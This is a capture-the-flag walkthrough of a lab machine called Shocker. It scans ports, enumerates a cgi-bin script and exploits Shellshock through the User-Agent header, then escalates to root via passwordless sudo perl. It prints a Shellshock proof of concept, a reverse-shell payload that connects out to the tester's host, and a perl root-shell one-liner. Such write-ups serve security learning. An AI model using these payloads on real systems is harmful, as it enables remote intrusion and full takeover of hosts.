1, Recon 
port scan 
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Page check
![](images/Pasted%20image%2020241206060213.png)
There is only one image and a line of sentence.

So I would continue to enumerate the web-content.
![](images/Pasted%20image%2020241206060533.png)
It seems like there would be scripts from `cgi-bin/`, Let's continue enumerating it.
```
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x sh,cgi,pl
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh,cgi,pl
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
```
Then we can get a `user.sh`.
```
Content-Type: text/plain

Just an uptime test script

 06:14:17 up  7:18,  0 users,  load average: 0.00, 0.01, 0.00
```
But it seems like no hint here, so I would use burpsuite to check what happen here.
we get the response
```
HTTP/1.1 200 OK
Date: Fri, 06 Dec 2024 11:17:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 118

Content-Type: text/plain

Just an uptime test script

 06:17:12 up  7:21,  0 users,  load average: 0.02, 0.02, 0.00

```
I found a wired content-type `text/x-sh` and by searching it, i found one introduction
`inside Shellshock: How hackers are using it to exploit systems`
`https://blog.cloudflare.com/inside-shellshock/`
```
ShellShock, AKA Bashdoor or CVE-2014-6271, was a vulnerability in Bash discovered in 2014 which has to do with the Bash syntax for defining functions. It allowed an attacker to execute commands in places where it should only be doing something safe like defining an environment variable. An initial POC was this:

env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

This was a big deal because lots of different programs would take user input and use it to define environment variables, the most famous of which was CGI-based web servers. For example, it’s very typically to store the User-Agent string in an environment variable. And since the UA string is completely attacker controlled, this led to remote code execution on these systems.
```

If I’m ok to assume based on the CGI script and the name of that box that ShellShock is the vector here, I can just test is manually. I’ll send the request for user.sh over to Burp Repeater and play with it a bit. Because the UA string is a common target, I’ll try adding the POC there:
![](images/Pasted%20image%2020241206062141.png)
That means our payload is worked, so we can try to handle a reverse shell.
`() { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.16.8/443 0>&1`

Then we successfully get the shell as shelly.

2, shell as root
By check what to do as root
```
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

That means we just use perl to run the shell and get the root shell.
`sudo perl -e 'exec "/bin/sh";'`
